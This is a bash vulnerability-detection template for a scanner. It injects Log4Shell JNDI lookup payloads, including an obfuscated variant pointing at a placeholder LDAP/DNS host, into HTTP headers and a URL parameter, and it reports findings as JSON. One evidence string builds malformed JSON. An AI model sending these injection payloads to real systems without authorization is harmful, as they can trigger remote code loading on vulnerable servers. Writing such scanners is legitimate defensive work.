#!/bin/bash
# @id: log4shell-detection
# @name: Log4Shell (CVE-2021-44228) Vulnerability Detection
# @author: CERT-X-GEN Security Team
# @severity: critical
# @description: Detects Log4Shell vulnerability by injecting JNDI payloads into HTTP headers
# @tags: log4shell, cve-2021-44228, rce, jndi, java
# @cwe: CWE-502
# @confidence: 85

set -euo pipefail

# Template metadata
TEMPLATE_ID="log4shell-detection"
TEMPLATE_NAME="Log4Shell (CVE-2021-44228) Vulnerability Detection"
SEVERITY="critical"
CONFIDENCE=85

# Get target from environment or args
TARGET="${CERT_X_GEN_TARGET_HOST:-${1:-}}"
PORT="${CERT_X_GEN_TARGET_PORT:-${2:-80}}"
ENGINE_MODE="${CERT_X_GEN_MODE:-}"

# Escape string for JSON
escape_json() {
    local s="$1"
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    s="${s//$'\n'/\\n}"
    s="${s//$'\r'/\\r}"
    s="${s//$'\t'/\\t}"
    printf '%s' "$s"
}

# Create finding JSON with all required fields
create_finding() {
    local title="$1"
    local description="$2"
    local evidence="$3"
    local severity="$4"
    local matched_at="${TARGET}:${PORT}"
    
    cat <<EOF
{"template_id":"${TEMPLATE_ID}","template_name":"${TEMPLATE_NAME}","severity":"${severity}","confidence":${CONFIDENCE},"title":"$(escape_json "$title")","description":"$(escape_json "$description")","evidence":${evidence},"matched_at":"${matched_at}","cwe":"CWE-502","remediation":"Upgrade Log4j to 2.17.0 or later"}
EOF
}

# Output wrapper with findings and metadata
output_json() {
    local findings_array="$1"
    local timestamp
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    
    cat <<EOF
{"findings":${findings_array},"metadata":{"template_id":"${TEMPLATE_ID}","template_name":"${TEMPLATE_NAME}","timestamp":"${timestamp}","target":"${TARGET}","port":${PORT}}}
EOF
}

# Check if curl is available
check_curl() {
    if ! command -v curl &>/dev/null; then
        echo "Error: curl is required" >&2
        return 1
    fi
    return 0
}

# URL encode string
url_encode() {
    local string="$1"
    local length="${#string}"
    local encoded=""
    
    for ((i = 0; i < length; i++)); do
        local c="${string:$i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    
    printf '%s' "$encoded"
}

# Test for Log4Shell vulnerability
test_log4shell() {
    local host="$1"
    local port="$2"
    local scheme="http"
    
    [[ "$port" == "443" ]] && scheme="https"
    
    # JNDI payloads for detection
    local payloads=(
        '${jndi:ldap://log4shell.test/a}'
        '${jndi:dns://log4shell.test}'
        '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://log4shell.test}'
    )
    
    # Headers to inject
    local headers=("User-Agent" "X-Forwarded-For" "X-Api-Version" "Referer")
    
    local findings=()
    
    for payload in "${payloads[@]}"; do
        for header in "${headers[@]}"; do
            # Make request with payload in header
            local response
            response=$(curl -s -w "\n%{http_code}" -m 10 -k \
                -H "${header}: ${payload}" \
                "${scheme}://${host}:${port}/" 2>/dev/null) || continue
            
            local status_code="${response##*$'\n'}"
            local body="${response%$'\n'*}"
            
            # Check for indicators
            if echo "$body" | grep -qi "jndi\|ldap\|log4j\|javax.naming"; then
                local evidence='{"host":"'"${host}"'","port":'"${port}"',"header":"'"${header}"'","indicator":"JNDI reference in response"}'
                findings+=("$(create_finding \
                    "Log4Shell Vulnerability Detected" \
                    "Target ${host}:${port} appears vulnerable to CVE-2021-44228. Payload in ${header} header triggered JNDI-related response." \
                    "$evidence" \
                    "critical")")
                break 2
            fi
            
            # Check for 500 errors that might indicate vulnerability
            if [[ "$status_code" =~ ^5[0-9][0-9]$ ]]; then
                if echo "$body" | grep -qi "error\|exception"; then
                    local evidence='{"host":"'"${host}"'","port":'"${port}"',"header":"'"${header}"'","status_code":'"${status_code}"',"indicator":"Server error from payload"}'
                    findings+=("$(create_finding \
                        "Potential Log4Shell Vulnerability" \
                        "Target ${host}:${port} returned server error when Log4Shell payload injected in ${header} header." \
                        "$evidence" \
                        "high")")
                    break 2
                fi
            fi
        done
    done
    
    # Test in URL parameter
    if [[ ${#findings[@]} -eq 0 ]]; then
        local encoded_payload
        encoded_payload=$(url_encode '${jndi:ldap://log4shell.test/x}')
        
        local response
        response=$(curl -s -w "\n%{http_code}" -m 10 -k \
            "${scheme}://${host}:${port}/?test=${encoded_payload}" 2>/dev/null) || true
        
        local body="${response%$'\n'*}"
        
        if echo "$body" | grep -qi "jndi\|ldap\|log4j"; then
            local evidence='{"host":"'"${host}"'","port":'"${port}"'","parameter":"test","indicator":"JNDI in response"}'
            findings+=("$(create_finding \
                "Log4Shell Vulnerability in URL Parameter" \
                "Target ${host}:${port} appears vulnerable via URL parameter injection." \
                "$evidence" \
                "critical")")
        fi
    fi
    
    # Build findings array
    local json="["
    for i in "${!findings[@]}"; do
        [[ $i -gt 0 ]] && json+=","
        json+="${findings[$i]}"
    done
    json+="]"
    echo "$json"
}

# Main
main() {
    if [[ -z "$TARGET" ]]; then
        echo "Error: No target specified" >&2
        echo "Usage: $0 <target> [port]" >&2
        echo "Or set CERT_X_GEN_TARGET_HOST environment variable" >&2
        output_json "[]"
        exit 1
    fi
    
    if ! check_curl; then
        output_json "[]"
        exit 1
    fi
    
    local findings_array
    findings_array=$(test_log4shell "$TARGET" "$PORT")
    
    # Output with wrapper
    local output
    output=$(output_json "$findings_array")
    
    if [[ "$ENGINE_MODE" == "engine" ]]; then
        echo "[CERT-X-GEN-JSON]${output}[/CERT-X-GEN-JSON]"
    else
        echo "$output"
    fi
}

main
